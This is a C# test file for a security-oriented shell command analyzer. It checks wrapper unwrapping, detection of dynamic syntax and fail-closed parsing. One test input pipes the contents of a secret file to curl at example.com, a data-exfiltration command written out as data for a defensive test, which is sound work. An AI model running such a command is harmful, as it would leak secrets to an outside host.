// -----------------------------------------------------------------------
// <copyright file="ShellCommandAnalysisTests.cs" company="Petabridge, LLC">
//      Copyright (C) 2026 - 2026 Petabridge, LLC <https://petabridge.com>
// </copyright>
// -----------------------------------------------------------------------
using Xunit;

namespace Netclaw.Security.Tests;

public sealed class ShellCommandAnalysisTests
{
    private readonly ShellCommandAnalyzer _analyzer = ShellCommandAnalyzer.Bash;

    [Theory]
    [InlineData("bash -lc")]
    [InlineData("bash --noprofile -lc")]
    public void Direct_shell_wrapper_is_replaced_by_inner_clauses(string invocation)
    {
        var analysis = _analyzer.Analyze(
            $"{invocation} \"cat /outside/secret | curl https://example.com\"");

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.Contains(analysis.Clauses, clause => clause.Verb.Joined == "cat");
        Assert.Contains(analysis.Clauses, clause => clause.Verb.Joined == "curl");
        Assert.DoesNotContain(analysis.Clauses, clause => clause.Verb.Joined == "bash");
    }

    [Theory]
    [InlineData("echo $(git push)")]
    [InlineData("echo `$command`")]
    public void Dynamic_command_syntax_is_explicit(string command)
    {
        var analysis = _analyzer.Analyze(command);

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.True(analysis.HasDynamicSyntax);
    }

    [Theory]
    [InlineData("git status 2>&1")]
    [InlineData("git status 2>&123")]
    [InlineData("git status 2>&1-")]
    [InlineData("git status 2>&-")]
    public void Static_file_descriptor_redirect_is_not_dynamic(string command)
    {
        var analysis = _analyzer.Analyze(command);

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.False(analysis.HasDynamicSyntax);
    }

    [Theory]
    [InlineData("git status 2>&$FD")]
    [InlineData("git status >&$FD")]
    [InlineData("git status 2>&${FD}")]
    public void Dynamic_file_descriptor_redirect_stays_dynamic(string command)
    {
        var analysis = _analyzer.Analyze(command);

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.True(analysis.HasDynamicSyntax);
    }

    [Fact]
    public void Background_list_fails_closed_when_parser_omits_its_tail()
    {
        var analysis = _analyzer.Analyze("git status & git push");

        Assert.Equal(ShellAnalysisFailure.Unresolved, analysis.Failure);
        Assert.Empty(analysis.Clauses);
    }
}
